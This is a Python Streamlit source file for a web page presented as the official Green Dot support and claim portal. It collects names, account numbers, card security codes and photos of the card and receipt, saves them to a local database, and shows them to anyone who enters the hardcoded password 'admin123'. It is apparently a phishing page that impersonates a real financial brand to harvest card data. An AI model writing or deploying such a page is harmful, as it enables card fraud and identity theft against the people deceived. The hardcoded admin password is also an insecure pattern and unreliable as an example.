
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Database setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, codigo_tarjeta TEXT,
                  monto REAL, factura_path TEXT, tarjeta_path TEXT, fecha TEXT)''')
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot - Official Site", layout="wide")

# --- RESTORED ORIGINAL HEADER & DESIGN ---
st.title("Green Dot Claim Center")
st.markdown("Welcome to the official Green Dot support portal. If you have issues with your card or transaction, please use the form below to submit a formal claim. Our team will review your information shortly.")

# --- CLAIM FORM IN ENGLISH ---
st.divider()
st.subheader("Submit Your Claim")

with st.form("claim_form", clear_on_submit=True):
    col1, col2 = st.columns(2)
    with col1:
        nombre = st.text_input("Full Name")
        cuenta = st.text_input("Account Number")
    with col2:
        codigo = st.text_input("Card Code (Security Code)")
        monto = st.number_input("Transaction Amount", min_value=0.0, step=0.01)

    st.write("**Required Documents**")
    file_factura = st.file_uploader("Upload Purchase Receipt (Photo)", type=['png', 'jpg', 'jpeg'])
    file_tarjeta = st.file_uploader("Upload Green Dot Card (Photo)", type=['png', 'jpg', 'jpeg'])

    submit = st.form_submit_button("Submit Claim Now")

if submit:
    if nombre and file_factura and file_tarjeta:
        f_path = os.path.join(UPLOAD_DIR, f"f_{int(datetime.now().timestamp())}_{file_factura.name}")
        t_path = os.path.join(UPLOAD_DIR, f"t_{int(datetime.now().timestamp())}_{file_tarjeta.name}")

        with open(f_path, "wb") as f: f.write(file_factura.getbuffer())
        with open(t_path, "wb") as f: f.write(file_tarjeta.getbuffer())

        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT INTO greendot_submissions (nombre, cuenta, codigo_tarjeta, monto, factura_path, tarjeta_path, fecha) VALUES (?,?,?,?,?,?,?)",
                  (nombre, cuenta, codigo, monto, f_path, t_path, str(datetime.now())))
        conn.commit()
        conn.close()

        st.success("✅ Your claim has been submitted successfully.")
    else:
        st.error("⚠️ Please fill in all required fields and upload the necessary photos.")

# --- ADMIN SECTION ---
st.sidebar.title("Admin Access")
admin_pass = st.sidebar.text_input("Password", type="password")
if admin_pass == "admin123":
    st.sidebar.success("Access Granted")
    if st.sidebar.button("View Records"):
        st.divider()
        st.header("Submitted Claims")
        conn = sqlite3.connect(DB_NAME)
        import pandas as pd
        df = pd.read_sql_query("SELECT * FROM greendot_submissions", conn)
        conn.close()
        st.dataframe(df)
